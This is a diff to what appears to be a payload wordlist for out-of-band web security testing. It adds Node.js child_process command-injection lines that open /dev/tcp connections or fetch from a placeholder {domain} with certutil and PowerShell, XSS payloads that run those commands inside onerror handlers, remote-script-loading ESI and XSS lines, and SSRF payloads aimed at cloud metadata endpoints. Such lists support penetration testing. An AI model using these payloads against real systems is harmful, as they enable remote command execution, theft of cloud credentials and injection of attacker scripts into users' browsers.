@@ -472,6 +472,14 @@ child_process.execSync(`ping {domain} -c 2`);
 child_process.execSync(`powershell -c (New-Object Net.WebClient).DownloadString('http://{domain}')`);
 child_process.execSync(`powershell -c Invoke-WebRequest 'http://{domain}'`);
 child_process.execSync(`sleep 9`);
+require('child_process').execSync(`/bin/bash -c true > /dev/tcp/{domain}/80`).toString());
+require('child_process').execSync(`/bin/sh -c true > /dev/tcp/{domain}/80`).toString());
+require('child_process').execSync(`certutil -urlcache -f 'http://{domain}'`).toString());
+require('child_process').execSync(`exec 6< /dev/tcp/{domain}/80`).toString());
+require('child_process').execSync(`ping {domain} -c 2`).toString());
+require('child_process').execSync(`powershell -c (New-Object Net.WebClient).DownloadString('http://{domain}')`).toString());
+require('child_process').execSync(`powershell -c Invoke-WebRequest 'http://{domain}'`).toString());
+require('child_process').execSync(`sleep 9`).toString());
 cos%0Asystem%0A(S%27curl%20{domain}%27%0AtR.%0A
 cos%0Asystem%0A(S%27ping%20-c%205%20127.0.0.1%27%0AtR.%0A
 cos%0Asystem%0A(S%27ping%20-c%205%20{domain}%27%0AtR.%0A
@@ -630,18 +638,18 @@ ${"freemarker.template.utility.Execute"?new()("powershell -c Invoke-WebRequest '
 <!--#exec cmd="exec 6< /dev/tcp/{domain}/80" -->
 <!--#exec cmd="powershell -c (New-Object Net.WebClient).DownloadString('http://{domain}')" -->
 <!--#exec cmd="powershell -c Invoke-WebRequest 'http://{domain}'" -->
-<!--#echo var="DATE_LOCAL" --><!--#exec cmd="ls" --><esi:include src=http://{domain}/>x=<esi:assign name="var1" value="'cript'"/><s<esi:vars name="$(var1)"/>>alert(/Chrome%20XSS%20filter%20bypass/);</s<esi:vars name="$(var1)"/>>
-<xsl:value-of select="system-property('xsl:version')" /><esi:include src="http://{domain}/data/news.xml" stylesheet="http://{domain}//news_template.xsl"></esi:include>
+<!--#echo var="DATE_LOCAL" --><!--#exec cmd="ls" --><esi:include src=//{domain}/>x=<esi:assign name="var1" value="'cript'"/><s<esi:vars name="$(var1)"/>>alert(/Chrome%20XSS%20filter%20bypass/);</s<esi:vars name="$(var1)"/>>
+<xsl:value-of select="system-property('xsl:version')" /><esi:include src="//{domain}/data/news.xml" stylesheet="http://{domain}//news_template.xsl"></esi:include>
 javascript:/*-- >]]>%>?></script></title></textarea></noscript></style></xmp>">[img=1,name=/alert(1)/.source]<img - /style=a:expression&#40&#47&#42'/- /*&#39,/**/eval(name)/*%2A///*///&#41;;width:100%;height:100%;position:absolute;-ms-behavior:url(#default#time2) name=alert(1)onerror=eval(name) src=1 autofocus onfocus=eval(name)onclick=eval(name) onmouseover=eval(name) onbegin=eval(name)background=javascript:eval(name)//>"
-<img src="{domain}">
-"'`><img src="{domain}"" onerror=prompt() />
-">><marquee><img src=x onerror=confirm(1)></marquee>" ></plaintext\></|\><plaintext/onmouseover=prompt(1) ><script>prompt(1)</script>@gmail.com<isindex formaction=javascript:alert(/XSS/) type=submit>'-->" ></script><script>alert(1)</script>"><img/id="confirm( 1)"/alt="/"src="/"onerror=eval(id&%23x29;>'"><img src="http://{domain}">
-"'`><ImG Src={domain} OnerRor=ProMpt(DoCumEnt.DoMAIn)
+<img src=//{domain}>
+"'`><img src="//{domain}"" onerror=prompt() />
+">><marquee><img src=//{domain} onerror=confirm(1)></marquee>" ></plaintext\></|\><plaintext/onmouseover=prompt(1) ><script>prompt(1)</script>@gmail.com<isindex formaction=javascript:alert(/XSS/) type=submit>'-->" ></script><script>alert(1)</script>"><img/id="confirm( 1)"/alt="/"src="/"onerror=eval(id&%23x29;>'"><img src="http://{domain}">
+"'`><ImG Src=//{domain} OnerRor=ProMpt(DoCumEnt.DoMAIn)
 <scRiPt src=//{domain}></scRiPt>
 "><scRiPt src=//{domain}></scRiPt>
 `><scRiPt src=//{domain}></scRiPt>
 "'`><scRiPt src=//{domain}></scRiPt>
-JAvasCripT:eval('var a=document.createElement(\'scrIpT\');a.src=\'https://{domain}\';document.body.appendChild(a)')
+JAvasCripT:eval('var a=document.createElement(\'scrIpT\');a.src=\'//{domain}\';document.body.appendChild(a)')
 <ScrIPt>function b(){eval(this.responseText)};a=new XMLHttpRequest();a.addEventListener("load", b);a.open("GET", "//{domain}");a.send();</sCrIPt>
 <sCrIpt>$.getScript("//{domain}")</sCRipt>
 </script><svg/onload='+/"/+/onmouseover=1/
@@ -662,6 +670,14 @@ document.documentElement.appendChild(s))//'>
 //%0D%0A%0d%0a//><ScRiPT src=//{domain}></ScRiPT>
 //%0D%0A%0d%0a//><ScRiPT>$.getScRiPT("//{domain}")</ScRiPT>
 %0d%0aLocation:%20http://{domain}
+"'`><img src=//{domain} onerror="confirm(require('child_process').execSync(`/bin/bash -c true > /dev/tcp/{domain}/80`).toString());">
+"'`><img src=//{domain} onerror="confirm(require('child_process').execSync(`/bin/sh -c true > /dev/tcp/{domain}/80`).toString());">
+"'`><img src=//{domain} onerror="confirm(require('child_process').execSync(`certutil -urlcache -f 'http://{domain}'`).toString());">
+"'`><img src=//{domain} onerror="confirm(require('child_process').execSync(`exec 6< /dev/tcp/{domain}/80`).toString());">
+"'`><img src=//{domain} onerror="confirm(require('child_process').execSync(`ping {domain} -c 2`).toString());">
+"'`><img src=//{domain} onerror="confirm(require('child_process').execSync(`powershell -c (New-Object Net.WebClient).DownloadString('http://{domain}')`).toString());">
+"'`><img src=//{domain} onerror="confirm(require('child_process').execSync(`powershell -c Invoke-WebRequest 'http://{domain}'`).toString());">
+"'`><img src=//{domain} onerror="confirm(require('child_process').execSync(`sleep 9`).toString());">
 http://{domain}
 \\{domain}
 {white-listed-domain}
@@ -740,4 +756,44 @@ https://{domain}/..%3B/
 /.;/{white-listed-domain}.{domain}/
 /.;/https://{domain}/
 /.;///{domain}/
+http://169.254.169.254
+http://169.254.169.254/
+//169.254.169.254/
+\\169.254.169.254/
+http://169.254.169.254/metadata
+http://169.254.169.254/metadata/
+//169.254.169.254/metadata/
+\\169.254.169.254/metadata\
+http://169.254.169.254/latest/metadata
+http://169.254.169.254/latest/metadata/
+//169.254.169.254/latest/metadata
+\\169.254.169.254\latest\metadata
+http://169.254.169.254/metadata/v1
+http://169.254.169.254/metadata/v1/
+//169.254.169.254/metadata/v1/
+\\169.254.169.254\metadata\v1\
+http://metadata.google.internal/computeMetadata/v1
+http://metadata.google.internal/computeMetadata/v1/
+//metadata.google.internal/computeMetadata/v1
+\\metadata.google.internal\computeMetadata\v1
+http://169.254.169.254%00
+http://169.254.169.254/%00
+//169.254.169.254/%00
+\\169.254.169.254/%00
+http://169.254.169.254/metadata%00
+http://169.254.169.254/metadata/%00
+//169.254.169.254/metadata/%00
+\\169.254.169.254/metadata\%00
+http://169.254.169.254/latest/metadata%00
+http://169.254.169.254/latest/metadata/%00
+//169.254.169.254/latest/metadata%00
+\\169.254.169.254\latest\metadata%00
+http://169.254.169.254/metadata/v1%00
+http://169.254.169.254/metadata/v1/%00
+//169.254.169.254/metadata/v1/%00
+\\169.254.169.254\metadata\v1\%00
+http://metadata.google.internal/computeMetadata/v1%00
+http://metadata.google.internal/computeMetadata/v1/%00
+//metadata.google.internal/computeMetadata/v1%00
+\\metadata.google.internal\computeMetadata\v1%00
 %E2%A0%80%0A%E2%A0%80
